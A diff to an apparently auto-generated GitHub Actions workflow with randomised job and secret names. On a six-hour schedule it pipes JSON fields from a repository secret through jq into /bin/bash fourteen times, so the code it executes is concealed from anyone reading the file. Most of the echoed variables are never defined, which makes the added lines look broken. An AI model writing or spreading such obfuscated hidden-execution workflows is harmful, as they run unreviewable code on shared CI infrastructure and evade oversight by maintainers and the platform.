@@ -1,20 +1,32 @@
 name: mingyulu1837
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 1/6 * * *'
+    - cron: '21 0/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: mingyulu1837
         env:
-          hvtt62618: ${{ secrets.hvtt62618 }}
+          wchkz528: ${{ secrets.wchkz528 }}
         run: |
-          echo $hvtt62618 | jq -r .uke7075 | /bin/bash
-          echo $zi4 | jq -r .uwst31816 | /bin/bash
-          echo $i76 | jq -r .asr24839 | /bin/bash
-          echo $qummz92526 | jq -r .w9 | /bin/bash
+          echo $wchkz528 | jq -r .pdv532 | /bin/bash
+          echo $d2 | jq -r .kf65984 | /bin/bash
+          echo $jyzop53 | jq -r .ieepd79 | /bin/bash
+          echo $ql04952 | jq -r .gy2389 | /bin/bash
+          echo $sduvz8 | jq -r .tx8 | /bin/bash
+          echo $hkxl3 | jq -r .kpp44755 | /bin/bash
+          echo $cdcu569 | jq -r .qip3 | /bin/bash
+          echo $hq41 | jq -r .fcf3 | /bin/bash
+          echo $fds0049 | jq -r .jw81 | /bin/bash
+          echo $dkflm89339 | jq -r .hi33681 | /bin/bash
+          echo $py007 | jq -r .glke4 | /bin/bash
+          echo $sdfo56191 | jq -r .q7 | /bin/bash
+          echo $d0 | jq -r .spe0 | /bin/bash
+          echo $t61 | jq -r .jxki79 | /bin/bash
 
